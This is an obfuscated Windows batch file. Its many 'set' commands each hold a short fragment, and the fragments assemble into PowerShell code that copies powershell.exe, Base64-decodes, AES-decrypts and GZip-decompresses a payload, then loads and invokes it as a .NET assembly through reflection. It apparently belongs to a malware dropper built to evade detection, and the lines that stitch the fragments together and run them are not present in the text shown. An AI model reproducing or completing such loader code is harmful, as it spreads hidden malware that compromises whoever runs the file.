@echo off
set "jokXFdWYmY=do"
set "zxfliVIayf=po"
set "hDgxefelck=he"
set "LWCygajFnV=st"
set "oixwiTPbxt=Sy"
set "NHaDliVanl=32"
set "LTpGBwOELW=ll"
set "FZvRkrKcVn=py"
set "NOgkejQNkK=co"
set "tlbEPjQhkG=we"
set "xaMWXDSwpO= C"
set "MmVgYZLSjx=\v"
set "GMYLqMcjnA=nd"
set "DjfHaeXCah=ll"
set "uusXwuTOLV=1."
set "iyHfxEBRbH=y "
set "FOMOgNgPYy=:\"
set "lUdxTPYujK=s\"
set "ljQezWdtbP=rs"
set "eisbUOyGPr=ws"
set "tHbrMnoJZS=Wi"
set "IPjBfjoKqJ=0\"
set "aIYBHLJBRA=em"
set "sekYUvAMTE=Po"
set "ttsrOxaftV=rS"
set "sgzKyqGaMm=.e"
set "XZlQbMbmLI=we"
set "SoYJusKCGS=xe"
set "TJtJVsTkDc= /"
set "KbBzXXphOB=he"
set "FshnKGkVPx=in"
set "rtxveRnGLx=ow"
set "bljrMpsFqT=\W"
set "xdtgTSQxZh= %~dp0"
set "LYrwuWQrHj=cd"
set "hlCUBZzPwc=e]::"
set "vPTirgzUnE=Wyqo"
set "nrikthOtQH=-joi"
set "cUGvzVTYzq=am;$"
set "ceogKQYFtF=eam("
set "uiuCeMNNrN=morF"
set "RNjNyLhNqW=-Obj"
set "GssrqdKBxR=null"
set "VyyZGkJiWK=m(, "
set "AMiKIdofEg=, (,"
set "YnBAOERaDO=y.Cr"
set "LnxUBXoHCa=gth)"
set "YDtFyDGBCh=pKWL"
set "qNcxUiEBIN===')"
set "pSvDemDsVw=).Sp"
set "ZvfVqaFXGj=-4] "
set "XKnzPBeogI= [Sy"
set "JDBtaBotaj=pk.I"
set "WIvrbBuRFu=-1.."
set "nsKKJebkPW=;$nt"
set "xnxuIGeADx=ypto"
set "pTBlHtAYdU=ptor"
set "pMbdJCNwxe=and "
set "bXgshhWthi= = ["
set "eKAydRPQBC=tem."
set "KqeoLhZZCB=Invo"
set "eAapEzUGko=pose"
set "eAcEvllSEo=ELeD"
set "RkUcihoAvY=$ntG"
set "dZVcEiIlrm=x = "
set "QtVPfugChm=New-"
set "ZZzHlUXGZD=th('"
set "PnEzgHejsA=ispo"
set "YuyeEYpDeB=grap"
set "RFxUfpDKdz=rtS4"
set "SxbhUbXKmc=$jum"
set "ODrKIxSDdx=-nop"
set "egxgjYgLVn=rity"
set "pSeQRGWluc=::('"
set "BVlFYdZkHY=.-16"
set "ZRdDOczXEG=flec"
set "MyyfzhMIaq=.Mod"
set "pyQdXwrTKU=e = "
set "tVidxVyZCf='txe"
set "mLcifDwQLD=.Com"
set "sIuDItiMfm=FcNh"
set "rbloWKVdgo=.IO."
set "wOssvXkWvj=le  "
set "xUsFcWyngI=ck($"
set "HnpxVUySkl='[-1"
set "VCqVOsgBtn=S46e"
set "fTpkwONuTT=k.Pa"
set "drivZnTHJX=t Sy"
set "FzeZbAtEGq=)))"
set "lSjGacvsGh=embl"
set "iUIYNJUJUm=se()"
set "pnWbJnjNAE=d;$R"
set "ekdJTeVMSm=hy.A"
set "GzPYgrWAWp=vert"
set "fVXaeeBSpi='oPV"
set "nzwkvPBGzw=]::C"
set "fjSJBzxfdZ=  $D"
set "WNrMUaeBwo=Disp"
set "dDPcdXbXCV=$Bma"
set "UQnYimDtsj=rt]:"
set "VuVBAsOHiW=PKCS"
set "umPXLanRtn=.Cop"
set "LBMkYuYIpI=;$uJ"
set "rGLmmDTjfG=ddin"
set "mHxpiqQgal=$Bma"
set "FruKJfpuva=);$j"
set "ytspDrECGI=aDNK"
set "hWRPoIlZnT=$Bma"
set "hNSklNFPvt=trea"
set "glwxZDUfIW=);$R"
set "eZxgaqCuVb=Fina"
set "mBCLNeUUme=oin "
set "gOinSbXTup=;$nt"
set "FUAMUZGIWZ=7kGw"
set "QMAsBDqsTt=kyhK"
set "DmFJKvGJiL=THxh"
set "TVeituLiqY=.Cry"
set "CbLQGjQHwN=Mode"
set "sZdXmKdnsJ=wnpe"
set "NEoXiwKFdb=k.En"
set "YQIeRgFYsR=Obje"
set "cAHOVtJfjh=($pK"
set "AwMwOAwrCj=sion"
set "TYYbstdDyG=Syst"
set "picZtsogYk=.Ass"
set "JtAZrZJXfW=[Sys"
set "DXfjnRVKse=mNpk"
set "geiyysLJXX=join"
set "MNqNmBZZZP=pose"
set "TKqvBfnZeB= = $"
set "wPsTCQxLBb=yste"
set "RfIdzlHKEs=; };"
set "PsJkQkyYKS=stem"
set "HDoJaYkNGP=Stre"
set "oMwBgCDKeo=Ae.T"
set "DaRvgkPVky=n ''"
set "nBYqrjzYQB=jumb"
set "ZpNPLYWunu=)) {"
set "hIPnKmGLeW=mNpk"
set "Usvnzjdxft=();$"
set "UIRIiLKiva=[Env"
set "SAmRwSdHOI=]::("
set "BrLBisAnQM=IoO3"
set "VMAkXyuZIc=bs.D"
set "BtefxEtVZj=Dx);"
set "erYKCgKGWM=g = "
set "hOFkpNonGa== $R"
set "AlXUnWRdup=[-1."
set "IwGoWKTZaN=.Con"
set "mCfYAiYetg=);$R"
set "yFwSVRUkxx=ew-O"
set "RVKDuAWKGS=New-"
set "nXcuxTcyzT=6esa"
set "KhemWNpbDD=ptog"
set "hMbvBkHRdd=, $E"
set "tEcymmWMmB=$ELe"
set "wmPhBnjGRQ=.Key"
set "itABATlhIz=em.C"
set "VsnjvxSnHZ=form"
set "rBzecQCcaQ=bstr"
set "zoXQJIcYZR=($pK"
set "cXQECURSdl=m.IO"
set "nRhgyZcNbs=Bmor"
set "MabXQZEJPf=);$q"
set "qwQrfBvzqu=tS46"
set "iOgBeosscQ=x = "
set "VHiZJNwCjG=R5jf"
set "UsZdkQGrXL=U = "
set "lzTEGKFxHL= [Sy"
set "vtRANMHOaz=::De"
set "vRzCpfHBLI=tsWi"
set "DlcFvQlOoz=8kuY"
set "GahSSESUdt=TllA"
set "GFRYWvMgBP=vs ="
set "OpfHwVZdjd=oryS"
set "KsWLTEyulN=Obje"
set "PWdzvOVFHq=Secu"
set "xOxIyHzpEd=pStr"
set "RSDTRBtsBb= New"
set "jUVtQYFPzO='')("
set "dugahAGKrA=ress"
set "fbFspWmugn= '')"
set "sKlNGgxbTI=urit"
set "uOeujicoms=6] -"
set "LhoWCzMaBh=uJKB"
set "PvXCzMLEsB=WLM."
set "IfhriPFppm=gMod"
set "DwJeEeiSdI=] -j"
set "obbWffmUik=oArr"
set "TyVvjaMsRX=yste"
set "urWDcwIyZs=ne);"
set "lenTlfXFyf=ress"
set "ZZCcoHbNvt=]::N"
set "lxVZwReMCN=..-1"
set "lCwFuUTKna=rofi"
set "bakukDFCql=in $"
set "wPMaoKmGuU=ect "
set "iHzkatfJBS=V = "
set "HAsitvLgma=ptog"
set "vYeaBbgCFh=O.Me"
set "GboqRgOrIA=esaB"
set "ZCrKTiwlud=.Len"
set "NvxZsERtLt=Disp"
set "pfTOAKZMXx=3); "
set "IHpUSlUYhP=M.Su"
set "mHzvWRIBgF=.Dis"
set "IQsNHnEgOP=iron"
set "SEZbmEYsZf=.Cry"
set "GeXFFbWtlw=2VUN"
set "ukqkfqwVtU=DNJS"
set "mRgyKDLuXY=cH ="
set "oGxcXOTEHV='gni"
set "CcFdpkVkqR=zm83"
set "SVVtGbhveK=GAe "
set "TZhCLZezJM=BC;$"
set "DDvatBSOBi=n ''"
set "YDNcFkAFUf=WLM "
set "YCOWTETBbn=KBU."
set "AOOktZsSac=y]::"
set "tFtcCnhXRP=rity"
set "CvXVOqqJux=ewLi"
set "lKNhNqTsNb=OUYN"
set "uaiYGdmesx=)($D"
set "MJnuCSrSOP=ecry"
set "OHhCgcyvrZ=join"
